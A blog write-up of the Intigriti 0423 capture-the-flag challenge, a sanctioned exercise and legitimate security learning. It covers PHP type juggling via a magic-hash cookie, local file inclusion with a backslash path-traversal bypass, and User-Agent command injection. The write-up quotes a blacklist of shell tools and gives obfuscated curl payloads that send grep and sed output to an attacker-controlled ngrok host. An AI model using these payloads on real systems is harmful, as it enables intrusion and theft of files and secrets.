---
layout: post
title: Intigriti Challenge 0423 Writeup
tags: [intigriti, challenge, ctf]
---

Firstly, I would like to thank Intigriti and strangeMMonkey1 for this month's challenge. It was refreshing to see a challenge that differs from the usual XSS formula. I learned a lot from completing this challenge, and hopefully, this write-up will help you too or at least serve as a reference for the next PHP Type Juggling CTF that I come across.

This challenge is based around the vulnerability that arises when loose comparison is used within security controls and continues on to exploit local file inclusion and an os command injection vulnerability. 

The challenge begins with a login portal for an Italian brick sales site [https://challenge-0423.intigriti.io/challenge.php](https://challenge-0423.intigriti.io/challenge.php), which contains sample credentials for us to use: `strange:monkey`. 

![Challenge Login](/assets/img/ic0423-login.png)

Authentication is achieved via a POST to `/login.php`, followed by a 302 redirect to `/dashboard.php`. The response from `/login.php` set two cookies:
```http
Cookie: username=strange; account_type=dqwe13fdsfq2gys388
```

The dashboard appears to be a fairly simple page with only links to purchase different 'bricks' which happens to redirect to some tastefully chosen meme music videos. As the dashboard seems lacking in functionality for us to exploit, let's take a step back.

![Challenge Dashboard](/assets/img/ic0423-dashboard.png)

Now that we know what the application flow looks like using valid credentials, lets clear the cookies and head back to the login screen at `/challenge.php`. When logging in this time, use likely invalid credentials such as `notarealuser:notarealpassword` and observe the new redirect we receive to `/index_error.php?error=invalid username or password`. 
The `error` parameter seems like a likely candidate for a first exploitation attempt for Reflected XSS as the error value `invalid username or password`, but when trying the quintessential `<script>alert(document.domain)</script>` we receive a popup. It can't be that easy for an intigriti challenge, so we will log this one and see if it's useful later on. 

Looking at the source of the `/index_error.php` page revels a HTML comment reading ` <!-- dev TODO : remember to use strict comparison -->`. This is a direct hint at the vulnerability that may be present here, as if the developer had to remind themselves to use 'strict comparison', they may have been using 'loose comparison' instead. 

## Loose Comparison and Type Juggling
Loose comparison is the term for when `==` is used within code to compare two variables rather than `===`. Within languages such as PHP, the use of `==` equates the two variables regardless of their 'type' - string, integer, boolean etc. - whereas `===` is considered a 'strict comparison' as this will take into account the 'type' of the variables as well as their value.
In a security context, this means that an attacker could find values that are equal but of differing types to potentially fool the code into returning `true` and putting the application into a different state. This attack is termed 'Type Juggling' and is prevalent within PHP due to the dynamically typed nature of PHP.  

In order to find parameters within the application that are potentially vulnerable to type juggling, an easy first trick to try is to turn all of the parameters within the HTTP requests to a different type such as changing the string: `uname` to an empty array: `uname[]`. If the application does not prevent error messages from being returned to the user, we may be able to gain more insight into which parameters are vulnerable and the function of the code that is using our tweaked parameters.
Switching the parameters to arrays immediately returns errors on  `/index_error.php` and `/login.php`, both referring to `Array to string conversion`  which is the indication of the vulnerability we were looking for. The next step is to find a security control where we are able to bypass a security check using the type juggling vulnerability.

After logging back in with the provided credentials, the GET request to `/dashboard.php` can be modified to turn the parameters within the two cookie variables we noticed earlier into arrays. Changing the `account_type` parameter to an array and replaying the GET request to `/dashboard.php` presents us with an alternative error: `Uncaught TypeError: md5(): Argument #1 ($string) must be of type string, array given in /app/dashboard.php:68`.
This error message suggests that our input is being used in an `md5()` operation. Due to the context, it's likely being used to compare the value that we provide as our `account_type` is equal to a predefined value within the application, potentially `admin` or something similar, acting as a security control to present different dashboard content to a user with a privileged account type.

In order to bypass this security control, it seems that we will have to provide an `account_type` value that when encoded to an MD5 hash is equal to an unknown value stored within the application. Without knowing the value that we need to enter, this may seem impossible, however, we can make use of type juggling to find an alternative value. 

## Magic Hashes
There is a concept of 'Magic Hashes', where MD5, MD4 and SHA1 hashes can be generated in the format of scientific notation such as '0e34...' consisting of only numerical values after the 'e'. When these values are used within a loose comparison, they are interpreted as a number rather than a string, and the equation is evaluated as a numeric comparison. As '0e34...' will always equal 0 (0 to the power of anything is always 0) we can use this to cause PHP to compare it's MD5 string value to our '0'. Within PHP, converting a string value to an integer will also equal '0' if the string does not begin with a number so our comparison becomes '0' == '0', returning TRUE. 
For more information on Type Juggling see this handy OWASP guide: [https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
The MD5 magic hash that we could use to bypass the security check present on `/dashboard.php` can be calculated by automating the testing of many input strings, or found from an existing hash table such as the one provided by John Hammond here: [https://github.com/JohnHammond/ctf-katana#php](https://github.com/JohnHammond/ctf-katana#php)

Replacing the `account_type` cookie parameter value with `240610708`, the plaintext of a magic hash value, now changes the response received from `/dashboard.php`. A 4th item has been added to the dashboard, along with a `<h3>` tag referencing `custom_image.php`: `<h3 id="custom_image.php - try to catch the flag.txt ;)">`. This appears to be the next step in the challenge. 

![Challenge Goldwall](/assets/img/ic0423-goldwall.png)

## Local File Inclusion
Making a GET request to `/custom_image.php` returns an `<img>` tag with the src set to the `data:` scheme containing base64 encoded image data. It is odd for a PHP file to be used to serve static content such as this, but with no other parameters provided there is no clear method of modifying the content it returns. 
Due to the name `custom_image.php` we could make the assumption that this PHP file is able to intake a path variable to a file that it then formats into the `<img>` tag data that we have seen. To test this, URL parameters can be manually fuzzed for using some context-appropriate guesses such as 'image', 'path', input', 'url', or 'file'. 
When making the GET request with the `file` url parameter appended, the response changes to `Permission denied!` which give us a good indication that a local file inclusion vulnerability is present here.

With a local file inclusion vulnerability (LFI) we should be able to retrieve the contents of files in the system, and potentially leak source code of the application we are attacking. However, this LFI vulnerability appears to be restricted, as when requesting the `/etc/passwd` file with the url: `/custom_image.php?file=/etc/passwd` only returns the `Permission denied!` error and not the file contents we were hoping for. 
As this PHP file is intended to process images, let's try providing a path to a known image within the application: `/custom_image.php?file=www/web/images/graphic_needed.png`. Now, we receive the image file in the `<img>` tag format - note that the content length is different to same request made without the `file` parameter. The base64 encoded data within the tag can also be decoded to view the image data, so we know that the LFI does work but has restrictions implemented. 

## Path Traversal
Combining a path traversal vulnerability with the LFI may allow us to access other files outside of the images directory that we are allowed to access. 
We can identify that there is a `flag.txt` file under the root directory by making a separate request to `/flag.txt` and observing the 403 HTTP status code we receive in response. Let's try and read the contents of this .txt file with the use of the LFI and path traversal techniques:
`/custom_image.php?file=www/web/images/../../../flag.txt`.
However, upon making this request we are presented with an error output in the response stating that the file doesn't exist and showing that our request is actually being processed as `www/web/images/flag.txt`. The path traversal `../` are being filtered from our request. 

We could now try a variety of path traversal techniques to bypass the filter, however I noticed that with our previous trick of converting the request parameters to arrays, we receive more information here.
Sending the same request but supplying the `file[]` parameter (`/custom_image.php?file[]=www/web/images/../../../flag.txt`) causes the application to response with this error:
```
<br />
<b>Fatal error</b>:  Uncaught TypeError: strpos(): Argument #1 ($haystack) must be of type string, array given in /app/custom_image.php:12
Stack trace:
#0 /app/custom_image.php(12): strpos(Array, '../')
#1 /app/custom_image.php(36): getImage()
#2 {main}
  thrown in <b>/app/custom_image.php</b> on line <b>12</b><br />

```
From this error, the application is leaking part of the code that is processing our `file` parameter value. It appears that the `custom_image.php` file is using the PHP function `strpos()` against our path traversal url to identify any `../` supplied and potentially causing the `Permission denied!` error we received. 
As a bypass to this, we can try to use an alternative path traversal method such as switching the forward slashes out for backslashes and hoping that path normalisation helps us out: `/custom_image.php?file=www/web/images/..\..\..\flag.txt`

Success! The application now responds with an 'image' in the `<img>` tag format. This is noticalby shorter than the previous `<img>` tags as the contents should be the base64 encoded version of the `flag.txt` contents:
```
<img src="data: image/jpeg;base64,SGV5IE1hcmlvLCB0aGUgZmxhZyBpcyBpbiBhbm90aGVyIHBhdGghIFRyeSB0byBjaGVjayBoZXJlOgoKL2U3ZjcxN2VkLWQ0MjktNGQwMC04NjFkLTQxMzdkMWVmMjlhei85NzA5ZTk5My1iZTQzLTQxNTctODc5Yi03OGI2NDdmMTVmZjcvYWRtaW4ucGhwCg==">
```
Decoding the contents reveals the next step of the challenge, as we do not yet have the flag, rather a pointer on where to go next:
```
Hey Mario, the flag is in another path! Try to check here:

/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php
```

We can make a request to this new endpoint directly but the `admin.php` page has a location-based redirect to make the browser redirect to the `index_error.php` page we saw earlier, likely because we don't have the correct cookies for viewing this page. It does, however, still present the page when intercepting the response. This page doesn't appear to offer much additional functionality for us to explore other than a link to a `log_page.php` file located at `/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/log_page.php`. This page contains the following clue:
```
EH! VOLEVIH!

Little hint?
Nah, it's not that we're all user, agent.<br>
```
It looks like this is pointing us, not so subtly, at the 'User-Agent' header.

## RCE
As we now have access to a local file inclusion vulnerability in order to view the contents of the application's files, we can view the PHP code powering the `admin.php` page:
`/custom_image.php?file=www/web/images/..\..\..\e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php`.
The response to this request shows us that there is certainly PHP code executing that we couldn't previously see:

The first section of PHP code let us know that the cookie `username=admin` needed to be set to access the page and this resolved the location header redirect problem.
```php
<?php
if(isset($_COOKIE["username"])) {
  $a = $_COOKIE["username"];
  if($a !== 'admin'){
    header('Location: /index_error.php?error=invalid username or password');    
  }
}
if(!isset($_COOKIE["username"])){
  header('Location: /index_error.php?error=invalid username or password');
}
?>
```
![Challenge Admin](/assets/img/ic0423-admin.png)

The second php code snippet appears to have an OS Command Injection vulnerability as it is placing the `$SERVER["HTTP_USER_AGENT"]` into the php command `shell_exec()` albeit with some filtering done beforehand.
```php
<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+",
 " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"",
"=");
$user_agent = str_replace($blacklist, "", $user_agent);

shell_exec("echo \"" . $user_agent . "\" >> logUserAgent");
?>
```
This filtering looks to replace some bash commands and special characters with `""`, removing them from our command injection string; It also sends the `stdout` of the command to `logUserAgent`. The file `logUserAgent` appears to be an empty file, as we can view this directly or via the LFI: `/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/logUserAgent` however I believe this file is either set to read-only or symlinked to `/dev/null` so that we are unable to see the output of the commands we execute. 

In order to exploit this vulnerability, we will need to find a method of bypassing the filtering, finding the location of the real flag, and exfiltrating this data back to us.
To do this, we first need to setup a pingback server such as Burp Collaborator or ngrok to receive the command output and our flag. 

## Filter Bypass
Within the `shell_exec(echo...` context we are working within, we know that a shell such as `bash` or `sh` is likely being used. Within this context, inside of a `bash` command, we can use the `$()` notation to execute a subcommand that is processed before the parent command. This method enabled us to execute arbitrary commands rather than having the `$user_agent` value simply echoed out. With this assumption in mind, we can start looking for ways to execute commands without using the filtered strings and characters.

Within bash, we are able to use an unspecified parameter and have this replaced by nothing if the parameter is not recognised by `bash`, meaning that we can obfuscate our commands by injecting a parameter into them: who\`u\`ami becomes `whoami`.
Another tricky issue we have to work around is that spaces are also being filtered, so while we may be able to execute single commands this isn't too useful for exfiltrating the flag as most bash commands use spaces and arguments to function.

The way that bash sees the separations between the commands and the arguments provided is by using an 'Internal Field Separator'. This is something that can be called directly within bash and will represent a space, a tab, and a newline character, and is the ideal solution for filter evasion. The IFS is called within bash using the command substitution notation of `${}`, meaning that we are able to inject `${IFS}` into our command wherever a space is required.

## Getting The Flag
The final payload that we can use to find and exfiltrate the flag is:
```
User-Agent: $(cu`u`rl${IFS}https://cb88-165-227-226-151.eu.ngrok.io/$(grep${IFS}-ri${IFS}intigriti)))
```
This command string provided inside the `User-Agent` header executes `curl` and provides the URL of our ngrok instance as the first parameter, causing the intigriti challenge server to make a request to our ngrok server.
The URL that the intigriti challenge requests is created by another injected command that uses `grep` to recursively search the current directory for the string `intigriti` as we know that this is the beginning of the flag format `INTIGIRTI{}`. When grep finds a file matching this pattern, it will append the file name to the ngrok URL.

We can then observe the ngrok or Burp Collaborator logs to see the request arriving, containing the file name of the flag: `d5418803-972b-45a9-8ac0-07842dc2b607.txt` 
Now that we have the filename of the flag, we can manually navigate to this at: `https://challenge-0423.intigriti.io/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/d5418803-972b-45a9-8ac0-07842dc2b607.txt` 
Responding with the final flag value: 
`INTIGRITI{n0_XSS_7h15_m0n7h_p33pz_xD}`

We have now completed this challenge! 
As a final tip, it's also worth knowing that we could implement the bash command `sed` into our command injection string to read the file returned by `grep` one line at a time:
The `sed -n 1p filename` command will return the 1st line of the file, iterating `1p` will allow reading through each line of the file, one at a time. Using this method, we can exfiltrate the contents of any file on the system that we have permission to read using the URL pingback to ngrok. This is particularly useful if we didn't already have the LFI vulnerability within this challenge, or in this case it can simply be used to return the value of the flag without having to navigate to the flag file manually:
```
$(cu`u`rl{IFS}https://a58d-165-227-226-151.eu.ngrok.io/$(se`u`d${IFS}-n${IFS}1p${IFS}$(grep${IFS}-rli${IFS}intigriti)))
```

